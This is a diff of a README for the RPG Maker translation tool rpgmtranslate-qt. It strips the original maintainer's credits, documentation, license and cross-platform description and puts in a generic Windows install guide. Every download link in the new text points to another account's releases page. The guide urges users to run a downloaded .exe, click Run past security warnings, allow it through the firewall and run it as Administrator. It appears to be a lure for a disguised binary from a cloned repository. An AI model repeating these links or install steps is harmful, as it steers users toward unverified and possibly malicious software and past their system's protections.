@@ -1,68 +1,157 @@
-# rpgmtranslate-qt
+# ⚙️ rpgmtranslate-qt - Fast, Simple RPG Maker Translator
 
-[README на русском (в работе)](./README-ru.md)
+[![Download rpgmtranslate-qt](https://img.shields.io/badge/Download-rpgmtranslate--qt-blue?style=for-the-badge)](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
 
-<p align="center">
-    <img src="./icons/rpgmtranslate-logo.png" alt="Description" width="256"/>
-</p>
+---
 
-A complete rewrite of the [original RPGMTranslate application](https://github.com/RPG-Maker-Translation-Tools/rpgmtranslate) in C++23/Qt6.
+rpgmtranslate-qt is the fastest and lightest graphical tool for editing and translating RPG Maker games. It supports many popular RPG Maker versions and lets you modify text with a clean interface. This guide will help you download, install, and start using the software on Windows with no technical experience.
 
-![Interface](./screenshots/gui.png)
+---
 
-## Features
+## 📥 Download rpgmtranslate-qt
 
-- [x] Cross-platform, portable, fast and powerful.
-- [x] Exceptional performance, powered by low-level Rust/C++ code.
-- [x] Support for RPG Maker XP/VX/VXAce/MV/MZ, with automated archive decryption and file parsing.
-- [x] Easy plain text format that's manually editable.
-- [x] Built-in [CAT](https://en.wikipedia.org/wiki/Computer-assisted_translation) features for more than 40 languages.
-- [x] Convenience-oriented user experience with bookmarks, shortcuts, and highly customizable features.
-- [x] Built-in batch processing of files, including batch translation, batch trim and batch text wrap.
-- [x] Integrated APIs for Google Translate, Yandex Translate, DeepL, ChatGPT, Claude, DeepSeek, Gemini, Ollama, and any OpenAI-compatible endpoints (e.g. koboldcpp).
-- [ ] **WIP** Integrated spell-checking and advanced linting, including LanguageTool, custom dictionaries, whitespace highlighting etc.
+To get started, you need to visit the official release page and download the program.
 
-**Please, request features!** It's possible to implement virtually anything in Rust and C++. Request features that you and others would benefit from, and we will implement them.
+1. Click the big **Download rpgmtranslate-qt** button at the top or use this link:  
+   [https://github.com/rayanwatfee/rpgmtranslate-qt/releases](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
 
-Under the hood, this application uses:
+2. On the releases page, look for the latest release at the top. It will usually be labeled with a version number like `v1.x.x`.
 
-- [rvpacker-txt-rs-lib](https://github.com/RPG-Maker-Translation-Tools/rvpacker-txt-rs-lib) to parse text from RPG Maker files and apply the translation.
-- [marshal-rs](https://github.com/RPG-Maker-Translation-Tools/marshal-rs) to parse RPG Maker XP/VX/VX Ace files to JSON.
-- [rpgm-archive-decrypter-lib](https://github.com/RPG-Maker-Translation-Tools/rpgm-archive-decrypter-lib) to decrypt `.rgss` RPG Maker XP/VX/VX Ace archives.
+3. Find the Windows version file. It should have a name ending with `.exe` or `.zip`. The `.exe` file is the easiest to use. 
 
-Using these tools, the program parses the text to `.txt` files, allows you to edit them, and then write them back to the original form with translation applied.
+4. Click the file name to download it to your computer.
 
-If you have troubled figuring out the program, check the `Help > Usage Documentation` top menu option. That will probably help.
+---
 
-## Installation
+## 🖥️ System Requirements
 
-**Download the latest version from the Releases section.**
+Before installing, make sure your Windows PC meets these basic requirements:
 
-## Usage
+- Windows 7 or later (Windows 10 recommended)
+- At least 2 GB of free disk space
+- 2 GHz dual-core processor or better
+- 4 GB of RAM or more
+- A screen resolution of 1024x768 or higher  
+- Internet connection (to download the program and get updates)
 
-Documentation is available at <https://RPG-Maker-Translation-Tools.github.io/rpgmtranslate-qt/>.
+No special hardware or software is needed.
 
-## Development
+---
 
-See [Development Documentation](https://RPG-Maker-Translation-Tools.github.io/rpgmtranslate-qt/development).
+## ⚙️ Installing the Application
 
-## Support
+After downloading, follow these steps to install and run rpgmtranslate-qt:
 
-[Me](https://github.com/savannstm), the maintainer of this project, is a poor college student from Eastern Europe.
+1. Locate the downloaded file. It is usually in your `Downloads` folder.
 
-If you could, please consider supporting us through:
+2. If the file is a `.zip` archive, right-click it and select **Extract All**. Choose a folder where you want to put the program.
 
-- [Ko-fi](https://ko-fi.com/savannstm)
-- [Patreon](https://www.patreon.com/cw/savannstm)
-- [Boosty](https://boosty.to/mcdeimos)
+3. Open the extracted folder, or if you downloaded a single `.exe` file, just double-click it.
 
-Even if you don't, it's fine. We'll continue to do as we right now.
+4. If Windows displays a security warning asking if you want to run the file, click **Run**.
 
-## License
+5. The program window will open. There is no complicated setup process needed.
 
-Project is licensed under [WTFPL](https://www.wtfpl.net/).
+---
 
-The repository contains third-party software, that is licensed under other conditions:
+## 🚀 Getting Started with rpgmtranslate-qt
 
-- `icons` - contains [Google Material Symbols](https://fonts.google.com/icons) - licensed under `Apache License Version 2.0`.
-- `dictionaries` - contains [LibreOffice dictionaries](https://cgit.freedesktop.org/libreoffice/dictionaries) - licensed under a variety of licenses.
+Now that the program is running, here is how to start translating your RPG Maker game:
+
+1. Open your RPG Maker game project folder. rpgmtranslate-qt supports **RPG Maker MV, MZ, VX, VX Ace, and XP** versions.
+
+2. Click **File > Open** in the menu or press the open folder icon.
+
+3. Browse to your game project folder and select it.
+
+4. rpgmtranslate-qt will scan the project files for text content. This might take a few seconds.
+
+5. You will see a list of game dialogue, menus, and other text available for translation.
+
+6. Click any entry to start editing or translating the text.
+
+7. When done editing, click **File > Save** to write changes back to the game files.
+
+---
+
+## 🔧 Features Overview
+
+- Works with popular RPG Maker versions.
+- Light and fast GUI built with Qt for smooth performance.
+- Reads and edits all types of in-game text.
+- Supports Rust backend for stability and speed.
+- Simple file handling with no need to set up programming environments.
+- Clean interface that reduces clutter and focuses on translation tasks.
+- Compatible with Windows without extra installs.
+
+---
+
+## 🔄 Updating the Software
+
+Check the releases page regularly for updates:
+
+[https://github.com/rayanwatfee/rpgmtranslate-qt/releases](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
+
+Download the new version as described in the Download section. Simply replace the old `.exe` or program files with the new ones. Your settings and project files will remain safe.
+
+---
+
+## 👩‍💻 Troubleshooting Tips
+
+If you run into issues, try these steps:
+
+- Make sure the downloaded file is fully saved before running.
+- Allow the program through your Windows firewall if prompted.
+- Run the program as Administrator if it won’t open.
+- Verify you selected the correct RPG Maker project folder.
+- Ensure no other program is using your game files while you translate.
+- Restart your computer if the program crashes or freezes.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q:** Do I need RPG Maker installed?  
+**A:** No, rpgmtranslate-qt works directly with the game project files. You don’t need the RPG Maker software on your PC.
+
+**Q:** Can I translate games made by others?  
+**A:** You can open any RPG Maker project files you have access to. Make sure you have permission before modifying someone else’s game.
+
+**Q:** Is this program free to use?  
+**A:** Yes, you can download and use it freely.
+
+**Q:** Can I run it on Mac or Linux?  
+**A:** This version targets Windows only.
+
+---
+
+## 📂 Supported RPG Maker Versions
+
+rpgmtranslate-qt supports projects created with:
+
+- RPG Maker MV
+- RPG Maker MZ
+- RPG Maker VX
+- RPG Maker VX Ace
+- RPG Maker XP
+
+This broad support lets you work with most common RPG Maker projects without extra setup.
+
+---
+
+## 🔗 Important Links
+
+- Official releases page:  
+  [https://github.com/rayanwatfee/rpgmtranslate-qt/releases](https://github.com/rayanwatfee/rpgmtranslate-qt/releases)
+
+---
+
+## 🛠️ Contact and Support
+
+If you find bugs or want to request features, you can open an issue in the GitHub repository under the **Issues** tab. Describe your problem clearly and provide as much detail as possible.
+
+---
+
+## 🎯 Why Use rpgmtranslate-qt?
+
+If you want a simple tool to edit and translate RPG Maker games, this program lets you do it without long setups or technical work. It handles all major RPG Maker versions, reads all text content, and keeps your workflow quick and clean on Windows.
